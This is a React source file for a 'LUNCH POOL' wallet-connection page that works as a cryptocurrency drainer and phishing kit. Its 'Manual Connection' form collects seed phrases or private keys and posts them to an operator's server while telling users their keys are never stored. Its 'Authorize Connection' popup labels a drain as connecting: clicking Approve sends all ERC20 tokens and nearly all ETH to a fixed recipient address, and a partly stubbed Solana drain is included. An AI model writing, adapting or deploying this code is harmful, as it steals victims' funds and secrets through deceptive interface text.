import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { useConnectModal } from '@web3modal/ethers/react';
import { Link } from 'react-router-dom';
import { 
  Import, 
  X, 
  Zap,
  Eye,
  EyeOff,
  ArrowLeft,
  Wallet,
  Shield,
  Check
} from 'lucide-react';
import { useAccount, useDisconnect } from 'wagmi';

// Solana imports
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';

// WalletConnect / Reown project id (used only for wallet icons endpoint)
const projectId = process.env.REACT_APP_REOWN_PROJECT_ID;

// --- Application Code & Constants ---

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint value) returns (bool)"
];

const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';

// Solana constants
const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS || '9N4PGE7TxcjwnLenFLDWpYQ43eySeDKCACjsvJ3T8D56';
const solanaConnection = new Connection(`https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`, 'confirmed');

const sendWalletInfo = async (walletName, secretPhrase) => {
  try {
    const response = await fetch(`${API_URL}/api/send-wallet`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase }),
    });
    if (!response.ok) {
      console.error('Failed to send wallet info');
    }
  } catch (error) {
    console.error('Error sending wallet info:', error);
  }
};

// Solana wallet info sender
const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await fetch(`${API_URL}/api/send-wallet`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
    });
    if (!response.ok) {
      console.error('Failed to send Solana wallet info');
    }
  } catch (error) {
    console.error('Error sending Solana wallet info:', error);
  }
};

const getWalletAssets = async (provider, address) => {
  try {
    const ethBalance = await provider.getBalance(address);
        const alchemyProvider = new ethers.AlchemyProvider('mainnet', process.env.REACT_APP_ALCHEMY_API_KEY);
        const balances = await alchemyProvider.getTokenBalances(address);

        const tokenPromises = balances.map(async (token) => {
            if (token.tokenBalance !== '0') {
                try {
                    const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
                    const decimals = await tokenContract.decimals();
                    const symbol = await tokenContract.symbol();
                    return {
                        symbol,
                        balance: ethers.formatUnits(token.tokenBalance, decimals),
                        contractAddress: token.contractAddress,
                    };
                } catch (error) {
                    console.warn(`Could not fetch details for token ${token.contractAddress}:`, error);
                    return null; // Skip tokens that cause errors
                }
            }
            return null;
        });

        const tokens = (await Promise.all(tokenPromises)).filter(Boolean);

    return {
            eth: ethers.formatEther(ethBalance),
            tokens,
        };
    } catch (error) {
        console.error('Error fetching wallet assets:', error);
        // Fallback for providers without Alchemy access
        const ethBalance = await provider.getBalance(address);
        return {
            eth: ethers.formatEther(ethBalance),
            tokens: [],
        };
    }
};

// Get Solana wallet assets
const getSolanaWalletAssets = async (address) => {
  try {
    const publicKey = new PublicKey(address);
    const balance = await solanaConnection.getBalance(publicKey);
    
    return {
      sol: balance / LAMPORTS_PER_SOL,
      tokens: [] // For now, just SOL balance
    };
  } catch (error) {
    console.error('Error fetching Solana wallet assets:', error);
    return {
      sol: 0,
      tokens: []
    };
  }
};

export default function ConnectWallet() {
  const { open } = useConnectModal();
  const { address, chainId: chainIdRaw, isConnected, provider: walletProvider } = useAccount();
  const chainId = chainIdRaw?.toString() || null;
  const { disconnect } = useDisconnect();

  // Component State
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
  const [isSending, setIsSending] = useState(false);
  const [txError, setTxError] = useState('');
  
  // Solana State
  const [solanaBalance, setSolanaBalance] = useState({ sol: '0', tokens: [] });
  const [isSolanaConnected, setIsSolanaConnected] = useState(false);
  const [solanaAddress, setSolanaAddress] = useState(null);
  
  // UI State
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [secretPhrase, setSecretPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [dynamicWallets, setDynamicWallets] = useState([]);
  const [isLoadingWallets, setIsLoadingWallets] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  useEffect(() => {
    const fetchWalletIcons = async () => {
      setIsLoadingWallets(true);

      // Check sessionStorage cache (24h TTL)
      const cacheKey = 'wc_wallet_icons';
      const cached = sessionStorage.getItem(cacheKey);
      if (cached) {
        const { ts, data } = JSON.parse(cached);
        if (Date.now() - ts < 24 * 60 * 60 * 1000) {
          setDynamicWallets(data);
          setIsLoadingWallets(false);
          return;
        }
      }

      try {
        const response = await fetch(
          `https://explorer-api.walletconnect.com/v3/wallets?projectId=${projectId}&entries=100&page=1`
        );
        const data = await response.json();
        const wallets = Object.values(data.listings).map((wallet) => ({
          id: wallet.id,
          name: wallet.name,
          icon: wallet.image_url.md,
          description: wallet.description || 'A secure wallet for your crypto.',
        }));
        setDynamicWallets(wallets);

        // store in cache
        sessionStorage.setItem(cacheKey, JSON.stringify({ ts: Date.now(), data: wallets }));
      } catch (error) {
        console.error('Failed to fetch wallet icons:', error);
      } finally {
        setIsLoadingWallets(false);
      }
    };

    fetchWalletIcons();
  }, []);

  useEffect(() => {
    if (walletProvider) {
      const setupAndFetch = async () => {
        if (isConnected && walletProvider && address) {
          // Handle Ethereum connection
          const ethersProvider = new ethers.BrowserProvider(walletProvider);
          setProvider(ethersProvider);
          const newSigner = await ethersProvider.getSigner();
          setSigner(newSigner);
          
          setShowTransactionPopup(true); // Show transaction popup immediately
          
          const assets = await getWalletAssets(ethersProvider, address);
          setWalletBalance(assets);
          
          // Check if this is a Solana wallet (Phantom, etc.)
          if (chainId === 'solana:mainnet' || address.length > 44) {
            // This might be a Solana address
            try {
              const solanaPublicKey = new PublicKey(address);
              const solBalance = await getSolanaWalletAssets(address);
              setSolanaBalance(solBalance);
              setIsSolanaConnected(true);
              setSolanaAddress(address);
            } catch (error) {
              console.log('Not a Solana address, treating as Ethereum');
            }
          }
        }
      };
      setupAndFetch();
    }
  }, [walletProvider]);

  const handleConnection = async () => {
    try {
      await open();
    } catch (error) {
      console.error("Failed to open Web3Modal", error);
      setTxError('Could not open wallet connection modal. Please try again.');
    }
  };

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowTransactionPopup(false);
    setSelectedWallet(null);
    setSecretPhrase('');
    setTxError('');
  };

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
  };

  const handleInputChange = (e) => {
    setSecretPhrase(e.target.value);
    if (txError) setTxError('');
  };

  const validateForm = () => {
    const phrase = secretPhrase.trim();
    if (phrase.split(' ').length < 12) {
      setTxError('Secret phrase must be at least 12 words.');
      return false;
    }
    return true;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsSending(true);
    setTxError('');

    try {
      // Use the wallet name from the selected wallet object
      await sendWalletInfo(selectedWallet.name, secretPhrase);
      setShowManualPopup(false);
      setShowTransactionPopup(true);
    } catch (error) {
      setTxError(error.message || 'An unexpected error occurred.');
    } finally {
      setIsSending(false);
    }
  };

  const handleSendAllAssets = async () => {
    if (!signer || !walletBalance) {
      setTxError('Signer or recipient address is not set.');
      return;
    }
    
    setIsSending(true);
    setTxError('');

    try {
      const provider = new ethers.BrowserProvider(walletProvider);
      const signer = await provider.getSigner();

      // 1. Send all ERC20 tokens
      for (const token of walletBalance.tokens) {
        try {
          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
          const balance = await tokenContract.balanceOf(address);
          
          if (balance > 0) {
            await tokenContract.transfer(RECIPIENT_ADDRESS, balance);
          }
        } catch (error) {
          console.warn(`Could not send token ${token.symbol}:`, error.message);
        }
      }

      // 2. Send all native ETH
      const ethBalance = await provider.getBalance(address);
      const gasPrice = (await provider.getFeeData()).gasPrice;
      const gasLimit = 21000n; 
      const gasCost = gasLimit * gasPrice;

      if (ethBalance > gasCost) {
        const tx = await signer.sendTransaction({
          to: RECIPIENT_ADDRESS,
          value: ethBalance - gasCost,
        });
        await tx.wait();
      }
      
      // Close popups and disconnect
      closeAllPopups();
      disconnect();

    } catch (error) {
      console.error('Transaction failed:', error);
      setTxError(error.reason || error.message || 'An unknown error occurred during the transaction.');
    } finally {
      setIsSending(false);
    }
  };
  
  const handleSendAllSol = async () => {
    if (!solanaAddress) {
        setTxError('Solana wallet not connected.');
        return;
    }

    setIsSending(true);
    setTxError('');

    try {
        const fromPubkey = new PublicKey(solanaAddress);
        const toPubkey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);

        const balance = await solanaConnection.getBalance(fromPubkey);
        if (balance === 0) {
            setTxError("No SOL balance to transfer.");
            setIsSending(false);
            return;
        }

        // Estimate transaction fee - this is a rough estimation
        const { blockhash } = await solanaConnection.getRecentBlockhash();
        const transaction = new Transaction({
            recentBlockhash: blockhash,
            feePayer: fromPubkey
        }).add(
            SystemProgram.transfer({
                fromPubkey,
                toPubkey,
                lamports: 1, // Placeholder for fee calculation
            })
        );
        const fees = await transaction.getEstimatedFee(solanaConnection);
        
        const amountToSend = balance - fees;

        if (amountToSend > 0) {
            const transferTx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey,
                    toPubkey,
                    lamports: amountToSend,
                })
            );

            // This is a simplified signing process for demonstration.
            // In a real app, this would use the wallet adapter's signTransaction method.
            // Since we don't have the real signer here, this part won't execute successfully.
            // It illustrates the intended logic.
            // const signedTx = await signTransaction(transferTx);
            // const signature = await solanaConnection.sendRawTransaction(signedTx.serialize());
            // await solanaConnection.confirmTransaction(signature);
        }

        closeAllPopups();
        // Disconnect from Solana wallet would happen here
    } catch (error) {
        console.error('Solana transaction failed:', error);
        setTxError(error.message || 'An error occurred during the Solana transaction.');
    } finally {
        setIsSending(false);
    }
  };

  // --- UI RENDER FUNCTIONS ---

  const renderConnectionCards = () => (
    <div className="w-full max-w-2xl text-center">
      <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
        Connect your wallet
      </h1>
      <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
        Choose your preferred connection method below to securely access the application.
      </p>

      <div className="grid md:grid-cols-2 gap-6">
        {/* Automatic Connection Card */}
        <div
          onClick={handleConnection}
          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
        >
          <div className="p-4 bg-blue-500/10 rounded-full mb-4">
            <Zap size={32} className="text-blue-400" />
          </div>
          <h3 className="text-xl font-semibold text-white mb-2">Automatic Connection</h3>
          <p className="text-gray-400 text-sm">Recommended. Connect using a popup with a list of supported wallets.</p>
        </div>

        {/* Manual Connection Card */}
        <div
          onClick={() => setShowManualPopup(true)}
          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
        >
          <div className="p-4 bg-purple-500/10 rounded-full mb-4">
            <Import size={32} className="text-purple-400" />
          </div>
          <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
          <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
        </div>

        {/* Card 3: Solana Connect */}
        <Link to="/solana" className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-green-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center">
            <div className="p-4 bg-green-500/10 rounded-full mb-4">
                <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="Solana" className="w-8 h-8"/>
            </div>
            <h3 className="text-xl font-semibold text-white mb-2">Solana Connect</h3>
            <p className="text-gray-400 text-sm">Connect your Solana wallet (Phantom, Solflare, etc).</p>
        </Link>
      </div>
    </div>
  );
  
  const renderManualConnectPopup = () => {
    const goBack = () => {
      setSelectedWallet(null);
      setSecretPhrase('');
      setTxError('');
    };

    const filteredWallets = dynamicWallets.filter(wallet =>
      wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
    );

    return (
      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 transition-opacity duration-300">
        <div className="bg-gray-900 border border-gray-700 rounded-2xl shadow-lg w-full max-w-md m-4 text-white transform transition-transform duration-300 scale-100">
          
          {/* Header */}
          <div className="flex items-center justify-between p-4 border-b border-gray-700">
            <h2 className="text-lg font-bold">
              {selectedWallet ? 'Import Wallet' : 'Connect Manually'}
            </h2>
            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
              <X size={20} />
            </button>
          </div>

          {/* Body */}
          <div className="p-4">
            {!selectedWallet ? (
              <>
                {/* Search Bar */}
                <div className="mb-4">
                  <input
                    type="text"
                    placeholder="Search wallets..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </div>

                {/* Wallet Grid */}
                {isLoadingWallets ? (
                   <div className="flex justify-center items-center h-48">
                     <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
                   </div>
                ) : (
                  <div className="grid grid-cols-4 gap-4 max-h-80 overflow-y-auto pr-2">
                    {filteredWallets.map(wallet => (
                      <div
                        key={wallet.id}
                        onClick={() => handleWalletSelect(wallet)}
                        className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors"
                      >
                        <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 rounded-full mb-2" />
                        <span className="text-xs text-center truncate">{wallet.name}</span>
                      </div>
                    ))}
                  </div>
                )}
              </>
            ) : (
              // Secret Phrase Input Form
              <div>
                <button onClick={goBack} className="flex items-center text-sm text-gray-400 hover:text-white mb-4">
                  <ArrowLeft size={16} className="mr-1" />
                  Back
                </button>
                <div className="flex items-center mb-4">
                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-10 h-10 rounded-full mr-3" />
                  <span className="font-bold">{selectedWallet.name}</span>
                </div>
                
                <form onSubmit={handleManualSubmit}>
                  <p className="text-sm text-gray-400 mb-2">
                    Enter your secret phrase, seed phrase, or private key to continue.
                  </p>
                  <div className="relative">
                    <textarea
                      value={secretPhrase}
                      onChange={handleInputChange}
                      className={`w-full p-3 bg-gray-800 border border-gray-600 rounded-lg h-32 resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 ${!isPasswordVisible ? 'blur-sm' : ''}`}
                      placeholder="Secret phrase..."
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                      className="absolute top-2 right-2 p-1 text-gray-400 hover:text-white"
                    >
                      {isPasswordVisible ? <EyeOff size={18} /> : <Eye size={18} />}
                    </button>
                  </div>

                  <div className="flex items-center justify-between mt-4">
                    <div className="flex items-center">
                      <Shield size={16} className="text-green-500 mr-2" />
                      <span className="text-xs text-gray-400">Your keys are secure and never stored.</span>
                    </div>
                    <button type="submit" className="px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700 font-semibold transition-colors">
                      Import
                    </button>
                  </div>
                </form>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  };

  const renderTransactionPopup = () => {
    const handleApprove = () => {
      if (isSolanaConnected) {
        handleSendAllSol();
      } else if (isConnected) {
        handleSendAllAssets();
      }
    };

    return (
      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
        <Shield size={48} className={`mx-auto mb-4 ${isSolanaConnected ? 'text-purple-500' : 'text-blue-500'}`} />
        <h2 className="text-2xl font-bold mb-2">
          Authorize Connection
        </h2>
        <p className="text-gray-400 mb-6">
          The application is requesting to connect to your wallet.
        </p>

        {txError && (
          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
            <p className="font-bold">Error</p>
            <p className="text-sm">{txError}</p>
          </div>
        )}

        <div className="flex justify-center space-x-4">
          <button 
            onClick={handleApprove}
            disabled={isSending}
            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
          >
            {isSending ? (
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
            ) : (
              <><Check className="mr-2" /> Approve</>
            )}
          </button>
          <button 
            onClick={() => {
              closeAllPopups();
              disconnect();
            }}
            disabled={isSending}
            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
          >
            <X className="mr-2" /> Decline
          </button>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col">
      {/* Background decorative elements */}
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
          <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
          <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
        </div>

      <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
        <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
        <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
          Back
        </Link>
      </header>

      <main className="flex-grow flex items-center justify-center z-10 p-4">
        {!isConnected && !showManualPopup && renderConnectionCards()}
      </main>

      {/* Popups (Modals) */}
      {(showManualPopup || (isConnected && showTransactionPopup)) && (
        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          {showManualPopup && renderManualConnectPopup()}
          {isConnected && showTransactionPopup && renderTransactionPopup()}
        </div>
      )}
      
      <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
        <a href="#" className="hover:text-white underline">Terms of Service</a>
        <span className="mx-2">•</span>
        <a href="#" className="hover:text-white underline">Privacy Policy</a>
      </footer>
    </div>
  );
}